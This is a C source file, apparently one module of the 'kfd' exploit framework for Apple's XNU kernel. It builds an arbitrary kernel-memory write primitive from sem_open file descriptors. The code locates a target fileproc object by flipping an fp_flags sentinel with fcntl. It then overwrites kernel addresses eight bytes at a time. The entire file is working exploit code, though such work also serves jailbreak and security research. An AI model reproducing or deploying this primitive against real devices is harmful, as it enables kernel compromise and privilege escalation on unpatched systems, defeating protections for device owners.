//
//  kwrite_sem_open.c
//  kfd
//
//  Created by mizole on 2024/01/04.
//

#include "kwrite_sem_open.h"

void kwrite_sem_open_init(struct kfd* kfd)
{
    kfd->kwrite.krkw_maximum_id = kfd->kread.krkw_maximum_id;
    kfd->kwrite.krkw_object_size = sizeof(struct fileproc);

    kfd->kwrite.krkw_method_data_size = kfd->kread.krkw_method_data_size;
    kfd->kwrite.krkw_method_data = kfd->kread.krkw_method_data;
}

void kwrite_sem_open_allocate(struct kfd* kfd, uint64_t id)
{
    if (id == 0) {
        id = kfd->kwrite.krkw_allocated_id = kfd->kread.krkw_allocated_id;
        if (kfd->kwrite.krkw_allocated_id == kfd->kwrite.krkw_maximum_id) {
            /*
             * Decrement krkw_allocated_id to account for increment in
             * krkw_helper_run_allocate(), because we return without allocating.
             */
            kfd->kwrite.krkw_allocated_id--;
            return;
        }
    }

    /*
     * Just piggyback.
     */
    kread_sem_open_allocate(kfd, id);
}

bool kwrite_sem_open_search(struct kfd* kfd, uint64_t object_uaddr)
{
    int32_t* fds = (int32_t*)(kfd->kwrite.krkw_method_data);

    if ((static_uget(fileproc, fp_iocount, object_uaddr) == 1) &&
        (static_uget(fileproc, fp_vflags, object_uaddr) == 0) &&
        (static_uget(fileproc, fp_flags, object_uaddr) == 0) &&
        (static_uget(fileproc, fp_guard_attrs, object_uaddr) == 0) &&
        (static_uget(fileproc, fp_glob, object_uaddr) > ptr_mask) &&
        (static_uget(fileproc, fp_guard, object_uaddr) == 0)) {
        for (uint64_t object_id = kfd->kwrite.krkw_searched_id; object_id < kfd->kwrite.krkw_allocated_id; object_id++) {
            assert_bsd(fcntl(fds[object_id], F_SETFD, FD_CLOEXEC));

            if (static_uget(fileproc, fp_flags, object_uaddr) == 1) {
                kfd->kwrite.krkw_object_id = object_id;
                return true;
            }

            assert_bsd(fcntl(fds[object_id], F_SETFD, 0));
        }

        /*
         * False alarm: it wasn't one of our fileproc objects.
         */
        print_warning("failed to find modified fp_flags sentinel");
    }

    return false;
}

void kwrite_sem_open_kwrite(struct kfd* kfd, void* uaddr, uint64_t kaddr, uint64_t size)
{
    volatile uint64_t* type_base = (volatile uint64_t*)(uaddr);
    uint64_t type_size = ((size) / (sizeof(uint64_t)));
    for (uint64_t type_offset = 0; type_offset < type_size; type_offset++) {
        uint64_t type_value = type_base[type_offset];
        kwrite_dup_kwrite_u64(kfd, kaddr + (type_offset * sizeof(uint64_t)), type_value);
    }
}

void kwrite_sem_open_find_proc(struct kfd* kfd)
{
    /*
     * Assume that kread is responsible for that.
     */
    return;
}

void kwrite_sem_open_deallocate(struct kfd* kfd, uint64_t id)
{
    /*
     * Skip the deallocation for the kread object because we are
     * responsible for deallocating all the shared file descriptors.
     */
    if (id != kfd->kread.krkw_object_id) {
        int32_t* fds = (int32_t*)(kfd->kwrite.krkw_method_data);
        assert_bsd(close(fds[id]));
    }
}

void kwrite_sem_open_free(struct kfd* kfd)
{
    /*
     * Note that we are responsible to deallocate the kread object, but we must
     * discard its object id because of the check in kwrite_sem_open_deallocate().
     */
    uint64_t kread_id = kfd->kread.krkw_object_id;
    kfd->kread.krkw_object_id = (-1);
    kwrite_sem_open_deallocate(kfd, kread_id);
    kwrite_sem_open_deallocate(kfd, kfd->kwrite.krkw_object_id);
    kwrite_sem_open_deallocate(kfd, kfd->kwrite.krkw_maximum_id);
}
